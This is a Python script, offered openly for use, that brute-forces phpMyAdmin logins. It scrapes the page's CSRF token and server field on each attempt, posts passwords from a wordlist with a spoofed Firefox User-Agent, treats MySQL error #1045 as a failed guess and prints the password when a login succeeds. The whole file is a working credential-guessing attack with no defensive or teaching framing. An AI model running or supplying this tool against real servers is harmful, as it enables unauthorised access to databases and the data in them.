#!/usr/bin/python3

""" Python 3 PhpMyAdmin bruteforce script """

from bs4 import BeautifulSoup
from requests import get, post
import argparse
from terminaltables import AsciiTable
from os import system
from math import floor

def banner():
    """ Shows banner """
    print(' ')	
    print('  Usage: brute.py [options]')
    print(' ')
    print('  Example: python3 brute.py -url http://localhost/phpmyadmin/ -user root -pswd passwords.txt')
    print('  -> to bruteforce root on http://localhost/phpmyadmin/ with passwords from passwords.txt(default passwords list)')
    print('	')

def parse_csrf_token(bs_tree: BeautifulSoup) -> str:
    """ Find csrf token """
    return bs_tree.select_one("input[name='token']")["value"]

def parse_server(bs_tree: BeautifulSoup) -> str:
    """ Find server number """
    return bs_tree.select_one("input[name='server']")["value"]

def login(url:str, username: str, password: str, csrf_token: str, server_num: str) -> bool:
    """ Tries to sign in """
    request = post(url, data={
        "pma_username": username,
        "pma_password": password,
        "server": server_num,
        "token": csrf_token,
        "target": "index.php",
    }, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
    })

    response_html = request.text

    # Error 1045 = login error
    if "#1045" in response_html or "AllowNoPassword" in response_html:
        return False

    return True

def bruteforce(phpmyadmin_url:str, username:str, pswd_file:str) -> None:
    """ Entry function """
    PASSWORDS_COUNT:int = sum(1 for _ in open(pswd_file, "r", encoding="utf8"))

    with open(pswd_file, "r", encoding="utf8") as file:
        i:int = 0

        for password in file:
            i += 1

            SOUP = BeautifulSoup(get(phpmyadmin_url).text, "html.parser")
            password:str = password.strip()
            SERVER:str = parse_server(SOUP)
            CSRF:str = parse_csrf_token(SOUP)

            attempt:bool = login(phpmyadmin_url, username, password, CSRF, SERVER)
            attempts_field:str = "%s / %s" % (i, PASSWORDS_COUNT)

            if attempt:
                exit("READY: PASSWORD IS `%s`" % password)
            
            table_data:list = [
                [ 'ATTEMPTS', 'LAST PASSWORD' ],
                [ attempts_field, password ]
            ]

            system('cls')
            print(AsciiTable(table_data).table)

    print('PASSWORD NOT FOUND((')


banner() #show banner

# parser
parser = argparse.ArgumentParser(description='PhpMyAdmin passwords bruteforce script, usage example: brute.py -url 127.0.0.1/phpmyadmin -user root -pswd passwords.txt')

parser.add_argument('-url', action="store", help="phpmyadmin login page url", required=True)
parser.add_argument('-user', action="store", help="mysql user", required=True)
parser.add_argument('-pswd', action="store", help="file with passwords", required=True)

args = parser.parse_args()

# run if valid arguments
bruteforce(args.url, args.user, args.pswd)
